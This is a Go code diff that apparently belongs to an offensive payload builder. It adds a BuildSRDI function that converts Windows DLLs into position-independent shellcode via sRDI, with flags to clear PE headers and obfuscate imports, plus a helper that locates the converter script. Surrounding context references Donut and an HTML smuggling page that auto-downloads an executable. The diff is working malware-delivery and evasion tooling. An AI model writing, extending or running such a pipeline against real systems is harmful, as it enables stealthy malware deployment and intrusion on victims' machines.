@@ -425,6 +425,98 @@ func findDonut() (string, error) {
 	return "", fmt.Errorf("donut not found")
 }
 
+// BuildSRDI converts a Windows DLL to position-independent shellcode using sRDI.
+// funcName is the export to call after DllMain (empty = no call).
+// userData is optional bytes passed to funcName as argument.
+// flags: 0x1=clear PE header, 0x4=obfuscate imports, 0x8=pass shellcode base.
+func BuildSRDI(dllPath, funcName string, userData []byte, flags int, outDir string) (string, error) {
+	script, err := findSRDIScript()
+	if err != nil {
+		return "", err
+	}
+	root := projectRoot()
+	outDir = absDir(root, outDir)
+	os.MkdirAll(outDir, 0755)
+
+	base := strings.TrimSuffix(filepath.Base(dllPath), filepath.Ext(filepath.Base(dllPath)))
+	outPath := filepath.Join(outDir, base+".srdi.bin")
+
+	// Write DLL to a temp copy so ConvertToShellcode.py can write its output
+	// next to it (it derives the output path by replacing .dll→.bin)
+	tmpDir, err := os.MkdirTemp("", "srdi_")
+	if err != nil {
+		return "", fmt.Errorf("tempdir: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+	tmpDLL := filepath.Join(tmpDir, "payload.dll")
+	dllBytes, err := os.ReadFile(dllPath)
+	if err != nil {
+		return "", fmt.Errorf("read dll: %w", err)
+	}
+	if err := os.WriteFile(tmpDLL, dllBytes, 0600); err != nil {
+		return "", fmt.Errorf("write tmp dll: %w", err)
+	}
+
+	args := []string{script, tmpDLL}
+	if funcName != "" {
+		args = append(args, "-f", funcName)
+	}
+	if len(userData) > 0 {
+		udFile := filepath.Join(tmpDir, "userdata.bin")
+		if err := os.WriteFile(udFile, userData, 0600); err == nil {
+			args = append(args, "-u", string(userData)) // pass as string arg
+		}
+	}
+	if flags&0x1 != 0 {
+		args = append(args, "-c")
+	}
+	if flags&0x4 != 0 {
+		args = append(args, "-i")
+	}
+	if flags&0x8 != 0 {
+		args = append(args, "-b")
+	}
+
+	cmd := exec.Command("python3", args...)
+	cmd.Dir = filepath.Dir(script) // ConvertToShellcode.py imports ShellcodeRDI from same dir
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("sRDI failed: %v\n%s", err, out)
+	}
+
+	// Script writes output as <tmpDLL>.replace('.dll', '.bin') = tmpDir/payload.bin
+	tmpBin := strings.TrimSuffix(tmpDLL, ".dll") + ".bin"
+	sc, err := os.ReadFile(tmpBin)
+	if err != nil {
+		return "", fmt.Errorf("sRDI produced no output: %w", err)
+	}
+	if err := os.WriteFile(outPath, sc, 0600); err != nil {
+		return "", fmt.Errorf("write srdi bin: %w", err)
+	}
+	return outPath, nil
+}
+
+// findSRDIScript returns the path to ConvertToShellcode.py from the sRDI repo.
+func findSRDIScript() (string, error) {
+	root := projectRoot()
+	candidates := []string{
+		filepath.Join(root, "tools", "sRDI", "Python", "ConvertToShellcode.py"),
+		filepath.Join(root, "tools", "sRDI", "ConvertToShellcode.py"),
+		"/opt/sRDI/Python/ConvertToShellcode.py",
+		"/opt/sRDI/ConvertToShellcode.py",
+	}
+	if home, err := os.UserHomeDir(); err == nil {
+		candidates = append(candidates,
+			filepath.Join(home, "tools", "sRDI", "Python", "ConvertToShellcode.py"),
+		)
+	}
+	for _, p := range candidates {
+		if _, err := os.Stat(p); err == nil {
+			return p, nil
+		}
+	}
+	return "", fmt.Errorf("ConvertToShellcode.py not found; run: git clone https://github.com/monoxgas/sRDI tools/sRDI")
+}
+
 // BuildHTML generates an HTML smuggling page that auto-downloads the EXE.
 func BuildHTML(exePath, outDir string) (string, error) {
 	data, err := os.ReadFile(exePath)
